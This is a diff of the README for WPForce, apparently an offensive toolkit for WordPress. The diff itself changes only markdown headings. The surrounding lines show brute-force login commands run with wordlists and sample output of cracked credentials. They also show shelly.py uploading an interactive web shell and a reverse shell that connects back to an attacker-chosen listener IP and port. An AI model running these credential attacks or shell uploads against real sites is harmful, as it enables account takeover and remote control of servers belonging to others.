@@ -1,12 +1,12 @@
-# WPForce
+## WPForce
 
-###Wordpress Brute Force Attack Tool
-###Last Updated: 2016-04-19
+#####Wordpress Brute Force Attack Tool
+#####Last Updated: 2016-04-19
 
-###ABOUT: 
-###This tool uses the Wordpress API to brute force login credentials.  A second module i being developed for post exploitation.
+#####ABOUT: 
+#####This tool uses the Wordpress API to brute force login credentials.  A second module i being developed for post exploitation.
 
-##Standard brute force attack with wpforce.py:
+**Standard brute force attack with wpforce.py:**
 ```
 USAGE: $ python wpforce.py -i usr.txt -w pass.txt -u "http://www.[website].com" 
 
@@ -32,7 +32,7 @@ URL: http://www[website].com
 All correct pairs:
 {'xxxxxxxxxxxxx@icloud.com': 'xxxxxxxxxxxxx', 'xxxxxxxxxxxxx@gmail.com': 'xxxxxxxxxxxxx'}
 ```
-##Interactive shell upload with shelly.py:
+**Interactive shell upload with shelly.py:**
 ```
 python shelly.py -t "http://www.[website].com" -u "[username]@gmail.com" -p "[password]" -i
        ,-~~-.___.       __        __ ____   _____
@@ -58,7 +58,7 @@ uid=4812176(dom.[website]) gid=15010(cgiuser) groups=15020,15010(cgiuser)
 
 os-shell> 
 ```
-##Reverse shell upload with shelly.py:
+**Reverse shell upload with shelly.py:**
 ```
 python shelly.py -t "http://www.[website].com" -u "[username]@gmail.com" -p "[password]" -lp 443 -li 10.0.0.0 -r
        ,-~~-.___.       __        __ ____   _____
